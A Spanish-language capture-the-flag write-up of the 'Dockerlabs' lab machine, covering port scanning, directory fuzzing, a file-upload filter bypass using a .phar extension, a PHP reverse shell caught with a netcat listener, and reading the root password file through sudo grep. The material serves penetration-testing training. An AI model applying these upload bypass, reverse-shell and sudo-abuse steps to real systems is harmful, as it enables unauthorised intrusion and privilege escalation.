# Dockerlabs

**Nivel:** Fácil

**Autor:** [El Pingüino de Mario](https://www.youtube.com/channel/UCGLfzfKRUsV6BzkrF1kJGsg)

------------------
## Escaneo 

Realizamos un escaneo general con **nmap** en la IP de la máquina víctima para identificar los puertos abiertos: 

```shell
sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 172.17.0.2
________________________________________________
PORT   STATE SERVICE REASON
80/tcp open  http    syn-ack ttl 64
```

A continuación, utilizamos los scripts predeterminados de **nmap** para recopilar más información sobre los puertos identificados:

```shell
nmap -sCV -p80 172.17.0.2
________________________________________________
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
|_http-server-header: Apache/2.4.58 (Ubuntu)
|_http-title: Dockerlabs
```

Evidenciamos un sitio web accedemos a este para inspeccionar su contenido:

![image](https://github.com/user-attachments/assets/b843c726-78b8-4d8f-8292-0f0adbe4572b)

Después de revisar el código de la página web e interactuar con esta no encontramos información relevante.

------------------
## Enumeración

Realizamos **fuzzing** utilizando **gobuster**:

```shell
gobuster dir -u http://172.17.0.2/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 20 -x html,php,txt,js -b '' -s 200,301
---------------------------------------------------------------------------------
/index.php            (Status: 200) [Size: 8235]
/uploads              (Status: 301) [Size: 310] [--> http://172.17.0.2/uploads/]
/scripts.js           (Status: 200) [Size: 919]
/upload.php           (Status: 200) [Size: 0]
/machine.php          (Status: 200) [Size: 1361]
```

Encontramos los ficheros **machine.php** y **upload.php** y el directorio **uploads**.

--------------
## Explotación

Al revisar la página **machine.php**, observamos que el formulario permite la carga de ficheros:

![image](https://github.com/user-attachments/assets/6a23ecd1-fdf2-46c0-8566-2e97b447704f)

Ahora intentamos subir una shell reversa en PHP:

Configuramos la shell [PHP Pentester monkey reverse shell](https://www.revshells.com/PHP%20PentestMonkey?ip=172.17.0.1&port=4444&shell=%2Fbin%2Fbash&encoding=%2Fbin%2Fbash) y lo guardamos como la extensión **PHP**. 

Nótese que hemos establecido **172.17.0.1** como la **IP** y **4444** como el **PORT** de escucha para el listener.

Sin embargo, la carga de ficheros está restringida a ficheros **zip**

![image](https://github.com/user-attachments/assets/66e941d2-aeeb-40e6-99bc-e5ac58ed30c6)

Procedemos a capturar el request con [Burp Suite](https://portswigger.net/burp/communitydownload) **Proxy** y ejecutar un **fuzzing** con **Intruder** para identificar extensiones **PHP** permitidas:

![image](https://github.com/user-attachments/assets/542229d9-2438-45ee-bf33-6bcec04b7608)

![image](https://github.com/user-attachments/assets/fa80e0e7-84bc-4a65-a3e7-3749bacc01df)

![image](https://github.com/user-attachments/assets/143d5370-a248-4019-9489-8fa2504f8403)

![image](https://github.com/user-attachments/assets/d8fce90b-0d49-4719-bb81-e1c3698e3c87)

Observamos que podemos subir ficheros con la extensión [**PHAR**](https://www.php.net/manual/es/phar.fileformat.phar.php)

Iniciamos el **listener** para la shell reversa con **netcat**:  

```shell
nc -lvnp 4444 
-------------------------------------------------------------------
listening on [any] 4444 ...
```

Ahora ejecutamos la shell reversa para obtener acceso inicial a la máquina víctima. Nótese que los ficheros almacenados se encuentran ubicados en el directorio **uploads**.

![image](https://github.com/user-attachments/assets/33c4d87b-80ef-4126-963a-3ae00cc82588)

```shell
connect to [172.17.0.1] from (UNKNOWN) [172.17.0.2] 48346
Linux 8b47fc7b6b14 6.6.9-amd64 #1 SMP PREEMPT_DYNAMIC Kali 6.6.9-1kali1 (2024-01-08) x86_64 x86_64 x86_64 GNU/Linux
 22:41:59 up 12:39,  0 user,  load average: 0.10, 0.12, 0.14
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
bash: cannot set terminal process group (24): Inappropriate ioctl for device
bash: no job control in this shell
www-data@8b47fc7b6b14:/$
```
------------------------------
### Tratamiento de TTY

Configuramos el **TTY** para una operación cómoda en la consola:

```shell
script /dev/null -c bash 
```
Presionamos **Ctrl  +  Z**, y luego ejecutamos:

```shell
stty raw -echo; fg
reset xterm
stty rows 35 columns 156
export TERM=xterm
export SHELL=bash
```

En los comandos anteriores es necesario ajustar los valores **rows** y **columns**  con los valores obtenidos al ejecutar en una consola de la máquina atacante el comando:

```shell
stty size
```

Ahora podemos utilizar **Ctrl+L** y **Ctrl+C**.

------------------------------
## Escalando privilegios

Verificamos si es posible ejecutar algún fichero como **root** con **sudo -l**:

```shell
sudo -l
------------------------------------------------
User www-data may run the following commands on 8b47fc7b6b14:
    (root) NOPASSWD: /usr/bin/cut
    (root) NOPASSWD: /usr/bin/grep
```

Podemos ejecutar **cut*** o **grep** como **root**. [GTFOBins for cut](https://gtfobins.github.io/gtfobins/cut/#sudo), [GTFOBins for grep](https://gtfobins.github.io/gtfobins/grep/#sudo).

Nótese que ambos binarios no permiten escalar privilegios, sin embargo, si permiten acceder a ficheros restringidos.

Revisamos los directorios del sistema para ver si encontramos algún fichero interesante:

```shell
ls /etc/
------------------------------------------------
adduser.conf            cron.daily      gai.conf   init.d         localtime    nsswitch.conf  profile.d  resolv.conf  ssl                sysctl.d
alternatives            debconf.conf    gnutls     issue          login.defs   opt            protocols  rmt          subgid             systemd
apache2                 debian_version  group      issue.net      logrotate.d  os-release     rc0.d      rpc          subgid-            terminfo
apt                     default         group-     kernel         lsb-release  pam.conf       rc1.d      security     subuid             timezone
bash.bashrc             deluser.conf    gshadow    ld.so.cache    machine-id   pam.d          rc2.d      selinux      subuid-            ucf.conf
bindresvport.blacklist  dpkg            gshadow-   ld.so.conf     mime.types   passwd         rc3.d      services     sudo.conf          ufw
ca-certificates         e2scrub.conf    gss        ld.so.conf.d   mke2fs.conf  passwd-        rc4.d      shadow       sudo_logsrvd.conf  update-motd.d
ca-certificates.conf    environment     host.conf  ldap           mtab         perl           rc5.d      shadow-      sudoers            xattr.conf
cloud                   ethertypes      hostname   legal          nanorc       php            rc6.d      shells       sudoers.d
cron.d                  fstab           hosts      libaudit.conf  networks     profile        rcS.d      skel         sysctl.conf
```

```shell
ls /opt/
------------------------------------------------
nota.txt
```

Encontramos el fichero **nota.txt** ubicado en el directorio **opt**, procedemos a verificar el contenido del mismo:

```shell
cat /opt/nota.txt
------------------------------------------------
Protege la clave de root, se encuentra en su directorio /root/clave.txt, menos mal que nadie tiene permisos para acceder a ella.
```

Encontramos un segundo fichero **clave.txt**, que seguramente está restringido al usuario **root** dado que se encuentra en el home del usuario.

```shell
cat /root/clave.txt
------------------------------------------------
cat: /root/clave.txt: Permission denied
```

Ahora utilizando el binario **grep** y siguiendo los comandos de [GTFOBins for grep](https://gtfobins.github.io/gtfobins/grep/#sudo) intentamos acceder al fichero restringido:

```shell
LFILE=/root/clave.txt
sudo grep '' $LFILE
```

Hemos obtenido la contraseña del usuario **root** y procedemos con la autenticación como **root** usando **su**:

```shell
su root
```

Hemos obtenido acceso como super usuario:

```shell
whoami
----------------
root
```
